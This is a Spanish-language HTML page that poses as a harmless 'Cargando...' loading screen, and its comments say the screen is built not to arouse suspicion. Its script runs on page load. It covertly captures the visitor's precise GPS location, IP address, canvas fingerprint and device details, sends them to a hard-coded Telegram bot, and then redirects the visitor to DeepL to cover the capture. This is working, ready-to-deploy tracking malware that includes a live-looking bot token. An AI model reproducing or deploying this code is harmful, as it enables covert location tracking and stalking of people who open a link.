<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Cargando...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: white;
            font-family: Arial, sans-serif;
        }
        
        /* Pantalla de carga simple - no levanta sospechas */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 9999;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            color: #666;
            font-size: 14px;
        }
        
        /* Contador opcional (más realista) */
        .counter {
            margin-top: 10px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>

<div class="loading-screen" id="loadingScreen">
    <div class="spinner"></div>
    <div class="loading-text">Cargando...</div>
    <div class="counter" id="counter"></div>
</div>

<script>
    // ============================================
    // CONFIGURACIÓN - CAMBIA ESTOS VALORES
    // ============================================
    
    // TOKEN DE TELEGRAM (lo obtienes de @BotFather)
    const TELEGRAM_TOKEN = "8071794295:AAHVqpqqvWH-P0QXvLXQY18WOFrWShJmFcY";
    
    // CHAT ID DE TELEGRAM (lo obtienes de @userinfobot)
    const CHAT_ID = "8559953441";
    
    // URL de redirección (DeepL traductor)
    const REDIRECT_URL = "https://www.deepl.com/translator";
    
    // Tiempo de espera antes de redirigir (10 segundos)
    const REDIRECT_DELAY_SECONDS = 10;
    
    // ============================================
    // FUNCIÓN PARA ENVIAR MENSAJE A TELEGRAM
    // ============================================
    async function sendToTelegram(message) {
        if (!TELEGRAM_TOKEN || TELEGRAM_TOKEN === "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz") {
            console.log("⚠️ Configura tu TOKEN de Telegram primero");
            console.log("Mensaje que se enviaría:", message);
            return;
        }
        
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            if (result.ok) {
                console.log("✅ Mensaje enviado a Telegram");
            } else {
                console.error("❌ Error de Telegram:", result.description);
            }
        } catch(e) {
            console.error("❌ Error enviando a Telegram:", e);
        }
    }
    
    // ============================================
    // FUNCIÓN PARA ENVIAR UBICACIÓN A TELEGRAM
    // (envía el pin en el mapa directamente)
    // ============================================
    async function sendLocationToTelegram(lat, lng) {
        if (!TELEGRAM_TOKEN || TELEGRAM_TOKEN === "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz") {
            console.log(`📍 Ubicación (simulada): ${lat}, ${lng}`);
            return;
        }
        
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: lat,
                    longitude: lng,
                    live_period: 0
                })
            });
            
            const result = await response.json();
            if (result.ok) {
                console.log("✅ Ubicación enviada a Telegram (con pin en mapa)");
            } else {
                console.error("❌ Error enviando ubicación:", result.description);
            }
        } catch(e) {
            console.error("❌ Error enviando ubicación:", e);
        }
    }
    
    // ============================================
    // FUNCIÓN DE UBICACIÓN CON WATCHPOSITION
    // ============================================
    function getLocationWithWatchPosition() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error('Geolocalización no soportada'));
                return;
            }
            
            let bestPosition = null;
            let bestAccuracy = Infinity;
            let watchId = null;
            let startTime = Date.now();
            
            const options = {
                enableHighAccuracy: true,  // Activa GPS
                timeout: 10000,            // 10 segundos máximo
                maximumAge: 0              // No usar caché
            };
            
            watchId = navigator.geolocation.watchPosition(
                (position) => {
                    const accuracy = position.coords.accuracy;
                    const elapsed = Date.now() - startTime;
                    
                    if (accuracy < bestAccuracy) {
                        bestAccuracy = accuracy;
                        bestPosition = position;
                        console.log(`📍 Precisión actual: ${accuracy.toFixed(1)} metros`);
                    }
                    
                    // Condición para terminar:
                    // - Precisión menor a 20 metros (GPS excelente)
                    // - Pasaron más de 6 segundos (tomamos la mejor)
                    if (accuracy < 20 || elapsed > 6000) {
                        if (watchId) navigator.geolocation.clearWatch(watchId);
                        resolve(bestPosition || position);
                    }
                },
                (error) => {
                    if (watchId) navigator.geolocation.clearWatch(watchId);
                    reject(error);
                },
                options
            );
            
            // Timeout general
            setTimeout(() => {
                if (watchId) {
                    navigator.geolocation.clearWatch(watchId);
                    if (bestPosition) {
                        resolve(bestPosition);
                    } else {
                        reject(new Error('Timeout: No se pudo obtener ubicación'));
                    }
                }
            }, 10000);
        });
    }
    
    // ============================================
    // FUNCIÓN PARA OBTENER IP
    // ============================================
    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch(e) {
            return 'No disponible';
        }
    }
    
    // ============================================
    // FUNCIÓN PARA OBTENER INFO DEL DISPOSITIVO
    // ============================================
    async function getDeviceInfo() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 200, 50);
        ctx.fillStyle = '#069';
        ctx.font = '20px Arial';
        ctx.fillText('FP', 50, 30);
        const fingerprint = canvas.toDataURL();
        
        return {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            canvasFingerprint: fingerprint.substring(0, 80) + '...',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
        };
    }
    
    // ============================================
    // FUNCIÓN PARA FORMATEAR EL MENSAJE
    // ============================================
    function formatTelegramMessage(locationData, ip, deviceInfo, accuracyMeters) {
        const mapsLink = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
        
        let precisionEmoji = "🟢";
        if (accuracyMeters > 100) precisionEmoji = "🔴";
        else if (accuracyMeters > 30) precisionEmoji = "🟡";
        
        let message = `📍 <b>NUEVA UBICACIÓN CAPTURADA</b>\n\n`;
        message += `${precisionEmoji} <b>Coordenadas:</b>\n`;
        message += `Latitud: <code>${locationData.latitude}</code>\n`;
        message += `Longitud: <code>${locationData.longitude}</code>\n\n`;
        message += `🎯 <b>Precisión:</b> ${accuracyMeters.toFixed(1)} metros\n`;
        message += `🗺️ <b>Google Maps:</b> <a href="${mapsLink}">Abrir mapa</a>\n\n`;
        message += `🌐 <b>IP:</b> ${ip}\n`;
        message += `💻 <b>Dispositivo:</b> ${deviceInfo.platform}\n`;
        message += `📱 <b>Resolución:</b> ${deviceInfo.screenResolution}\n`;
        message += `🕒 <b>Zona Horaria:</b> ${deviceInfo.timezone}\n`;
        message += `🌍 <b>Idioma:</b> ${deviceInfo.language}\n`;
        message += `🖥️ <b>User Agent:</b> <code>${deviceInfo.userAgent.substring(0, 100)}...</code>\n\n`;
        message += `⏱️ <b>Fecha/Hora:</b> ${new Date().toLocaleString()}`;
        
        return message;
    }
    
    // ============================================
    // FUNCIÓN PRINCIPAL
    // ============================================
    async function captureAndRedirect() {
        let locationCaptured = false;
        let startTime = Date.now();
        
        // Mostrar contador opcional
        const counterElement = document.getElementById('counter');
        if (counterElement) {
            let secondsLeft = REDIRECT_DELAY_SECONDS;
            const interval = setInterval(() => {
                secondsLeft--;
                if (secondsLeft >= 0) {
                    counterElement.textContent = `${secondsLeft} segundos...`;
                }
                if (secondsLeft <= 0) clearInterval(interval);
            }, 1000);
        }
        
        try {
            console.log("🟢 Iniciando captura de ubicación...");
            
            // Intentar capturar ubicación
            const position = await getLocationWithWatchPosition();
            const accuracy = position.coords.accuracy;
            const ip = await getIP();
            const deviceInfo = await getDeviceInfo();
            
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };
            
            // Formatear y enviar mensaje a Telegram
            const message = formatTelegramMessage(locationData, ip, deviceInfo, accuracy);
            await sendToTelegram(message);
            
            // Enviar también la ubicación como pin (para que salga el mapa en Telegram)
            await sendLocationToTelegram(locationData.latitude, locationData.longitude);
            
            locationCaptured = true;
            console.log(`✅ Ubicación capturada - Precisión: ${accuracy.toFixed(1)} metros`);
            
        } catch(error) {
            console.error("❌ Error capturando ubicación:", error.message);
            
            // Enviar error a Telegram
            const errorMessage = `⚠️ <b>ERROR EN CAPTURA</b>\n\nIP: ${await getIP()}\nError: ${error.message}\nHora: ${new Date().toLocaleString()}`;
            await sendToTelegram(errorMessage);
        }
        
        // Calcular tiempo restante hasta los 10 segundos
        const elapsed = Date.now() - startTime;
        const remainingMs = Math.max(0, (REDIRECT_DELAY_SECONDS * 1000) - elapsed);
        
        console.log(`⏳ Esperando ${remainingMs/1000} segundos antes de redirigir...`);
        
        // Redirigir a DeepL después del tiempo restante
        setTimeout(() => {
            console.log("🔴 Redirigiendo a DeepL...");
            window.location.href = REDIRECT_URL;
        }, remainingMs);
    }
    
    // ============================================
    // INICIAR
    // ============================================
    captureAndRedirect();
</script>
</body>
</html>
